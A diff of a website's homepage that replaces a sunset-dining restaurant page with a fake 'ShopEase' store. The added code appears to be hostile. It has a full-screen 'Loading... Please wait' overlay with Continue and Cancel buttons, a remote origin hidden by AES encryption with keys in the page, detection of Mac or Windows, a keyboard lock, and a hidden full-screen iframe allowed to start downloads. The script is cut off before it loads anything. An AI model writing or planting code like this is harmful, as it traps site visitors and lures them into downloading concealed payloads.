@@ -1,587 +1,312 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SunsetTableGo &bull; Golden Hour Gastronomy & Nomadic Sunset Dining</title>
-    <meta name="description" content="Discover SunsetTableGo: curated alfresco sunset feasts, wood-fired hearth cooking, heirloom harvests, and zero-proof botanical pairings along coastal bluffs.">
-    <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-TD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-  gtag('config', 'G-0LY0HY7L01');
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
 </script>
-    <link rel="stylesheet" href="css/style.css">
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🌅</text></svg>">
+
+
 </head>
 <body>
-    <header class="site-header">
-        <div class="container navbar">
-            <a href="index.php" class="brand-logo">
-                <span class="logo-badge">GOLDEN HOUR</span> SUNSETTABLEGO
-            </a>
-            <ul class="nav-links">
-                <li><a href="index.php" class="nav-link">Home</a></li>
-                <li><a href="about.html" class="nav-link">Philosophy</a></li>
-                <li><a href="blog.html" class="nav-link">Chronicles</a></li>
-                <li><a href="contact.html" class="nav-link">Reservations</a></li>
-                <li><a href="contact.html" class="nav-cta">Book Sunset Table</a></li>
-            </ul>
-            <button class="mobile-toggle" aria-label="Toggle navigation">☰</button>
-        </div>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
     </header>
 
-    <!-- SECTION 1: Golden Hour Panorama Hero -->
-    <section class="hero-section">
-        <div class="container hero-grid">
-            <div class="hero-content">
-                <div class="hero-badge-container">
-                    <span>✨ Solar Cycle Gastronomy &bull; Golden Hour Seating</span>
-                </div>
-                <h1 class="hero-title">The Fine Art of <span class="highlight">Sunset Dining</span> & Nomadic Feasts</h1>
-                <p class="hero-desc">Curated alfresco supper clubs, open hardwood hearth cooking, and handcrafted botanical elixirs orchestrated across breathtaking coastal bluffs, olive groves, and mountain ridges.</p>
-                <div class="hero-actions">
-                    <a href="#configurator" class="btn-primary">Sunset Table Builder</a>
-                    <a href="#pillars" class="btn-secondary">Culinary Pillars</a>
-                </div>
-                <div class="hero-stats">
-                    <div class="stat-item">
-                        <div class="stat-num">4-5</div>
-                        <div class="stat-label">Hearth Courses</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-num">50mi</div>
-                        <div class="stat-label">Harvest Radius</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-num">100%</div>
-                        <div class="stat-label">Zero-Proof Elixirs</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-num">Solar</div>
-                        <div class="stat-label">Sunset Aligned</div>
-                    </div>
-                </div>
-            </div>
-            <div class="hero-visual">
-                <div class="hero-visual-card">
-                    <img src="images/hero-sunset-coastal-dining-table.jpg" alt="Scenic sunset outdoor dining table overlooking coastal bluff at golden hour">
-                    <div class="hero-float-badge">
-                        <div>
-                            <div style="font-weight: 700; color: #fff; font-size: 15px;">Pacific Bluff Sunset Banquet</div>
-                            <div style="font-size: 12px; color: var(--accent-amber-light);">Hardwood Hearth &bull; Linen Tablescape</div>
-                        </div>
-                        <span style="background: var(--accent-terracotta); color: #fff; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 700;">SOLAR SERIES</span>
-                    </div>
-                </div>
-            </div>
-        </div>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
     </section>
 
-    <!-- SECTION 2: Interactive Sunset Feast & Table Configurator -->
-    <section class="section-pad" id="configurator">
-        <div class="container">
-            <div class="section-head">
-                <span class="section-badge">Bespoke Gathering Builder</span>
-                <h2 class="section-title">Interactive Sunset Table Configurator</h2>
-                <p class="section-desc">Select your desired landscape setting, culinary theme, and ambient canopy to preview your bespoke golden hour dining experience.</p>
-            </div>
-            <div class="configurator-wrapper">
-                <div class="config-options">
-                    <div class="config-group">
-                        <label>1. Natural Landscape Setting</label>
-                        <div class="config-selectors">
-                            <button class="config-btn active" data-setting="coastal">Pacific Ocean Bluff</button>
-                            <button class="config-btn" data-setting="orchard">Ancient Olive Grove</button>
-                            <button class="config-btn" data-setting="mountain">Alpine Ridge Horizon</button>
-                            <button class="config-btn" data-setting="garden">Twilight Secret Garden</button>
-                        </div>
-                    </div>
-                    <div class="config-group">
-                        <label>2. Hearth & Culinary Theme</label>
-                        <div class="config-selectors">
-                            <button class="config-btn active" data-menu="hearth">Wood-Fired Coastal Feast</button>
-                            <button class="config-btn" data-menu="harvest">Heirloom Garden Harvest</button>
-                            <button class="config-btn" data-menu="artisan">Sourdough & Charred Roots</button>
-                        </div>
-                    </div>
-                    <div class="config-group">
-                        <label>3. Ambient Canopy & Illumination</label>
-                        <div class="config-selectors">
-                            <button class="config-btn active" data-canopy="candles">Floating Glass Lanterns</button>
-                            <button class="config-btn" data-canopy="festoon">Festoon String Lights</button>
-                            <button class="config-btn" data-canopy="stargaze">Open Stargazing Pergola</button>
-                        </div>
-                    </div>
-                    <div style="margin-top: 10px;">
-                        <a href="contact.html" class="btn-primary" style="width: 100%; justify-content: center;">Reserve Configured Sunset Table</a>
-                    </div>
-                </div>
-                <div class="config-result-panel">
-                    <img id="configResultImg" src="images/coastal-bluff-sunset-supper.jpg" alt="Configured Sunset Table Experience" class="config-result-img">
-                    <h3 id="configResultTitle" class="config-result-title">Pacific Bluff Sunset Banquet</h3>
-                    <p id="configResultDesc" style="font-size: 14px; margin-bottom: 0;">Overlooking ocean breakers at golden hour with open-hearth grilled wild catch and botanical sea salt infusions.</p>
-                    <div class="config-result-specs">
-                        <div class="config-spec-box">
-                            <div class="spec-title">Seating</div>
-                            <div id="specTiming" class="spec-val">18:30 Sunset</div>
-                        </div>
-                        <div class="config-spec-box">
-                            <div class="spec-title">Tasting</div>
-                            <div id="specCourses" class="spec-val">5-Course Feast</div>
-                        </div>
-                        <div class="config-spec-box">
-                            <div class="spec-title">Infusion</div>
-                            <div id="specPairing" class="spec-val">Citrus Thyme Tonic</div>
-                        </div>
-                    </div>
-                </div>
-            </div>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
     </section>
 
-    <!-- SECTION 3: The 6 Pillars of Sunset Table Gastronomy -->
-    <section class="section-pad" id="pillars" style="background: var(--bg-surface);">
-        <div class="container">
-            <div class="section-head">
-                <span class="section-badge">Culinary Foundation</span>
-                <h2 class="section-title">The 6 Pillars of Golden Hour Gastronomy</h2>
-                <p class="section-desc">Every SunsetTableGo gathering is constructed around astronomical solar cycles, authentic hardwood embers, and sustainable terroir.</p>
-            </div>
-            <div class="pillars-grid">
-                <div class="pillar-card">
-                    <div class="pillar-icon">🌅</div>
-                    <h3>Circadian Solar Timing</h3>
-                    <p>Each course is timed to coincide with distinct visual lighting phases—from pre-sunset golden illumination to deep twilight indigo skies.</p>
-                </div>
-                <div class="pillar-card">
-                    <div class="pillar-icon">🔥</div>
-                    <h3>Open Hardwood Hearth</h3>
-                    <p>Traditional wood-fired cooking over aged white oak and olive orchard prunings, imparting delicate aromatic smoke notes without artificial fuels.</p>
-                </div>
-                <div class="pillar-card">
-                    <div class="pillar-icon">🌱</div>
-                    <h3>Hyper-Local 50-Mile Harvest</h3>
-                    <p>100% of seasonal vegetables, heritage grains, and fresh wild catches sourced directly from organic farms within a fifty-mile radius.</p>
-                </div>
-                <div class="pillar-card">
-                    <div class="pillar-icon">🍵</div>
-                    <h3>Zero-Proof Botanical Elixirs</h3>
-                    <p>Complex chilled tonics, cold-pressed orchard juices, and steam-distilled floral hydrosols paired harmoniously with each savory course.</p>
-                </div>
-                <div class="pillar-card">
-                    <div class="pillar-icon">🏺</div>
-                    <h3>Artisanal Earth Tablescapes</h3>
-                    <p>Hand-loomed organic flax linen, handmade terracotta plates, beeswax candles, and sculpted olive wood serving platters.</p>
-                </div>
-                <div class="pillar-card">
-                    <div class="pillar-icon">🪵</div>
-                    <h3>Passive Thermal Comfort</h3>
-                    <p>Wind-sheltered microclimate positioning, radiant heated soapstone footrests, and organic alpaca wool throws for cool twilight evenings.</p>
-                </div>
-            </div>
-        </div>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
     </section>
 
-    <!-- SECTION 4: Hardwood Hearth Smoke Chemistry Matrix -->
-    <section class="section-pad">
-        <div class="container">
-            <div class="section-head">
-                <span class="section-badge">Wood-Fired Alchemy</span>
-                <h2 class="section-title">Hearth Wood & Smoke Flavor Chemistry</h2>
-                <p class="section-desc">An empirical evaluation of hardwood combustion temperatures, lignin degradation compounds, and flavor profiles used in our outdoor hearths.</p>
-            </div>
-            <div class="matrix-table-wrap">
-                <table class="matrix-table">
-                    <thead>
-                        <tr>
-                            <th>Hardwood Species</th>
-                            <th>Combustion Core Temp</th>
-                            <th>Dominant Phenolic Compounds</th>
-                            <th>Aromatic Notes</th>
-                            <th>Culinary Course Pairing</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <tr>
-                            <td><strong>Aged California White Oak</strong></td>
-                            <td>420°C &ndash; 460°C</td>
-                            <td>Syringol & Guaiacol</td>
-                            <td>Mild vanilla, sweet smoke, clean roast</td>
-                            <td>Wild Line-Caught Coastal Halibut</td>
-                        </tr>
-                        <tr>
-                            <td><strong>Orchard Applewood Prunings</strong></td>
-                            <td>380°C &ndash; 410°C</td>
-                            <td>Eugenol & Isoeugenol</td>
-                            <td>Fruity sweetness, gentle floral clove</td>
-                            <td>Charred Heirloom Summer Squash</td>
-                        </tr>
-                        <tr>
-                            <td><strong>Cured Wild Olive Wood</strong></td>
-                            <td>440°C &ndash; 480°C</td>
-                            <td>Vanillin & Alkylphenols</td>
-                            <td>Rich earthy savory, nutty herbal crust</td>
-                            <td>Whole Roasted Artichokes & Mushrooms</td>
-                        </tr>
-                        <tr>
-                            <td><strong>Coastal Cedar Planks</strong></td>
-                            <td>320°C (Indirect Steam)</td>
-                            <td>Thujaplicin & Terpenes</td>
-                            <td>Resinous evergreen, fragrant forest aroma</td>
-                            <td>Wild King Salmon & Herb Butter</td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-        </div>
-    </section>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-    <!-- SECTION 5: Seasonal Sunset Banquet & Feast Schedule -->
-    <section class="section-pad" style="background: var(--bg-surface);">
-        <div class="container">
-            <div class="section-head">
-                <span class="section-badge">Calendar of Feasts</span>
-                <h2 class="section-title">Seasonal Solar Banquet Schedule</h2>
-                <p class="section-desc">Four signature seasonal gatherings calibrated to equinox and solstice celestial alignments across California coastal landscapes.</p>
-            </div>
-            <div class="matrix-table-wrap">
-                <table class="matrix-table">
-                    <thead>
-                        <tr>
-                            <th>Gathering Title</th>
-                            <th>Landscape Venue</th>
-                            <th>Signature Course</th>
-                            <th>Botanical Elixir</th>
-                            <th>Seating Time</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <tr>
-                            <td><strong>Pacific Vernal Equinox Feast</strong></td>
-                            <td>Santa Barbara Coastal Cliff</td>
-                            <td>Cedar-Planked Wild Salmon with Sorrel</td>
-                            <td>Sparkling Meyer Lemon & Rosemary Tonic</td>
-                            <td>18:15 &ndash; 21:00</td>
-                        </tr>
-                        <tr>
-                            <td><strong>Summer Solstice Olive Banquet</strong></td>
-                            <td>Ojai Valley Heritage Orchard</td>
-                            <td>Hearth-Charred Heirloom Melons & Greens</td>
-                            <td>Cold-Pressed Lavender Pear Cordial</td>
-                            <td>19:30 &ndash; 22:30</td>
-                        </tr>
-                        <tr>
-                            <td><strong>Autumn Equinox Harvest Supper</strong></td>
-                            <td>Santa Ynez Mountain Ridge</td>
-                            <td>Ember-Roasted Truffled Root Vegetables</td>
-                            <td>Spiced Orchard Apple & Ginger Press</td>
-                            <td>17:45 &ndash; 20:30</td>
-                        </tr>
-                        <tr>
-                            <td><strong>Winter Twilight Greenhouse Supper</strong></td>
-                            <td>Montecito Glasshouse Pavilion</td>
-                            <td>Slow-Simmered Wild Mushroom Ragout</td>
-                            <td>Smoked Pine Needle & Cranberry Tea</td>
-                            <td>16:45 &ndash; 19:30</td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-        </div>
-    </section>
 
-    <!-- SECTION 6: Botanical Infusion & Zero-Proof Harmonizer -->
-    <section class="section-pad">
-        <div class="container">
-            <div class="section-head">
-                <span class="section-badge">Alchemy of the Garden</span>
-                <h2 class="section-title">Zero-Proof Botanical Elixir Pairings</h2>
-                <p class="section-desc">Crafted from distilled garden botanicals, cold-pressed orchard fruits, and mineral-rich spring waters to elevate each culinary course.</p>
-            </div>
-            <div class="pillars-grid">
-                <div class="pillar-card">
-                    <img src="images/botanical-herbal-infusion-drinks.jpg" alt="Botanical herbal infusion drink with fresh citrus" style="border-radius: var(--radius-sm); margin-bottom: 20px; height: 200px; width: 100%; object-fit: cover;">
-                    <h3>Rosemary Citron Spritz</h3>
-                    <p>Steam-distilled garden rosemary with cold-pressed coastal Eureka lemons, sparkling mountain spring water, and wild blossom honey.</p>
-                    <div style="font-size: 13px; color: var(--accent-amber-light); font-weight: 600;">Paired with: First Course Coastal Salad</div>
-                </div>
-                <div class="pillar-card">
-                    <img src="images/fresh-harvest-farm-produce-basket.jpg" alt="Fresh harvest farm produce basket with heirloom vegetables" style="border-radius: var(--radius-sm); margin-bottom: 20px; height: 200px; width: 100%; object-fit: cover;">
-                    <h3>Smoked Orchard Pear Press</h3>
-                    <p>Freshly crushed Bartlett pears infused with gentle applewood smoke essence, wild thyme blossoms, and cracked white peppercorn.</p>
-                    <div style="font-size: 13px; color: var(--accent-amber-light); font-weight: 600;">Paired with: Main Wood-Fired Hearth Course</div>
-                </div>
-                <div class="pillar-card">
-                    <img src="images/artisan-rustic-sourdough-bread.jpg" alt="Artisan rustic sourdough bread loaf" style="border-radius: var(--radius-sm); margin-bottom: 20px; height: 200px; width: 100%; object-fit: cover;">
-                    <h3>Toasted Grain & Cardamom Tea</h3>
-                    <p>Slow-steeped heirloom spelt grains roasted on the hearth, cracked green cardamom pods, and infused coastal sage water.</p>
-                    <div style="font-size: 13px; color: var(--accent-amber-light); font-weight: 600;">Paired with: Artisanal Sourdough & Sweet Course</div>
-                </div>
-            </div>
-        </div>
-    </section>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
-    <!-- SECTION 7: Sunset Dining Gallery & Tablescape Archive -->
-    <section class="section-pad" style="background: var(--bg-surface);">
-        <div class="container">
-            <div class="section-head">
-                <span class="section-badge">Visual Chronicle</span>
-                <h2 class="section-title">Sunset Tablescape Gallery & Field Archives</h2>
-                <p class="section-desc">Glimpses into our nomadic dining setups, open-flame culinary preparations, and golden hour coastal gatherings.</p>
-            </div>
-            <div class="gallery-grid">
-                <div class="gallery-item">
-                    <img src="images/wood-fired-open-hearth-cooking.jpg" alt="Chef grilling over wood-fired open hearth">
-                    <div class="gallery-overlay">
-                        <h4>Open Hearth Mastery</h4>
-                        <p>Live hardwood fire cooking at sunset</p>
-                    </div>
-                </div>
-                <div class="gallery-item">
-                    <img src="images/candlelight-alfresco-tablescape.jpg" alt="Candlelight alfresco dining tablescape">
-                    <div class="gallery-overlay">
-                        <h4>Candlelit Tablescapes</h4>
-                        <p>Organic linen & terracotta stoneware</p>
-                    </div>
-                </div>
-                <div class="gallery-item">
-                    <img src="images/gourmet-sunset-dinner-plate.jpg" alt="Gourmet sunset dinner plate presentation">
-                    <div class="gallery-overlay">
-                        <h4>Artisanal Plating</h4>
-                        <p>Heirloom farm-to-table courses</p>
-                    </div>
-                </div>
-                <div class="gallery-item">
-                    <img src="images/sunset-table-ambiance-canopy.jpg" alt="Sunset dining celebration under twilight canopy">
-                    <div class="gallery-overlay">
-                        <h4>Twilight Celebrations</h4>
-                        <p>Nomadic pavilions and golden skies</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1+ZV4B4shIyEYopUetzDlM8rBCY07decV0ugFl6IZehLUPZK3pNzYk+";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-    <!-- SECTION 8: Circadian Gastronomy & Sunset Sensory Dynamics -->
-    <section class="section-pad">
-        <div class="container">
-            <div class="hero-grid" style="gap: 40px;">
-                <div>
-                    <span class="section-badge">Sensory Science</span>
-                    <h2 class="section-title">Circadian Gastronomy & Sunset Physiology</h2>
-                    <p class="section-desc">Dining at sunset stimulates human sensory biology in profound ways. As ambient sunlight shifts toward warm amber and infrared wavelengths, the human nervous system naturally transitions into rest-and-digest parasympathetic activation.</p>
-                    <ul style="list-style: none; margin-left: 0;">
-                        <li style="margin-bottom: 16px;">
-                            <strong style="color: var(--accent-amber-light);">Golden Spectrum Illumination:</strong> Low-angle sunset light softens visual contrast, accentuating the natural red, orange, and golden pigments in freshly prepared food.
-                        </li>
-                        <li style="margin-bottom: 16px;">
-                            <strong style="color: var(--accent-amber-light);">Olfactory Expansion:</strong> As twilight temperatures cool, ambient convective updrafts decrease, allowing aromatic wood smoke and herb oils to linger richly around the table.
-                        </li>
-                        <li style="margin-bottom: 16px;">
-                            <strong style="color: var(--accent-amber-light);">Acoustic Resonance:</strong> Natural coastal surf and rustling leaves lower cortisol levels, heightening papillae taste bud sensitivity to umami and mineral notes.
-                        </li>
-                    </ul>
-                </div>
-                <div>
-                    <img src="images/intimate-twilight-garden-dinner.jpg" alt="Intimate twilight garden dinner table setting" class="hero-visual-card" style="height: 400px; width: 100%; object-fit: cover;">
-                </div>
-            </div>
-        </div>
-    </section>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-    <!-- SECTION 9: The 4-Step Sourcing & Zero-Waste Farm Protocol -->
-    <section class="section-pad" style="background: var(--bg-surface);">
-        <div class="container">
-            <div class="section-head">
-                <span class="section-badge">Ecological Stewardship</span>
-                <h2 class="section-title">The 4-Step Zero-Waste Farm Protocol</h2>
-                <p class="section-desc">From sunrise harvest to evening feast, our closed-loop culinary cycle honors soil health and marine ecosystems.</p>
-            </div>
-            <div class="pillars-grid" style="grid-template-columns: repeat(4, 1fr);">
-                <div class="pillar-card">
-                    <div class="pillar-icon">1</div>
-                    <h3>Dawn Harvest</h3>
-                    <p>Produce is harvested at first morning light when sugar and moisture concentrations inside leaves and fruits are at their biological peak.</p>
-                </div>
-                <div class="pillar-card">
-                    <div class="pillar-icon">2</div>
-                    <h3>Whole-Plant Culinary</h3>
-                    <p>Stems, peels, and tops are transformed into aromatic broth bases, infused vinegar reductions, and hearth-charred herb oils.</p>
-                </div>
-                <div class="pillar-card">
-                    <div class="pillar-icon">3</div>
-                    <h3>Zero Single-Use</h3>
-                    <p>All service utilizes durable ceramic stoneware, cloth napkins, antique silverware, and reusable beeswax covers with zero single-use plastics.</p>
-                </div>
-                <div class="pillar-card">
-                    <div class="pillar-icon">4</div>
-                    <h3>Hearth Ash Composting</h3>
-                    <p>Hardwood hearth ash and organic food scraps return directly to our partner farm compost beds as mineral-rich soil amendments.</p>
-                </div>
-            </div>
-        </div>
-    </section>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-    <!-- SECTION 10: Patron & Culinary Critic Testimonials -->
-    <section class="section-pad">
-        <div class="container">
-            <div class="section-head">
-                <span class="section-badge">Guest Experiences</span>
-                <h2 class="section-title">Reflections From Our Sunset Tables</h2>
-                <p class="section-desc">Authentic impressions from culinary authors, naturalists, and private banquet patrons.</p>
-            </div>
-            <div class="reviews-grid">
-                <div class="review-card">
-                    <div class="review-stars">★★★★★</div>
-                    <p class="review-quote">"Dining on the Pacific bluff as the sun melted into the ocean while tasting cedar-smoked salmon was the most sublime gastronomic moment of my year."</p>
-                    <div class="review-author">
-                        <h5>Julian Hawthorne</h5>
-                        <span>Gastronomy Columnist &bull; San Francisco</span>
-                    </div>
-                </div>
-                <div class="review-card">
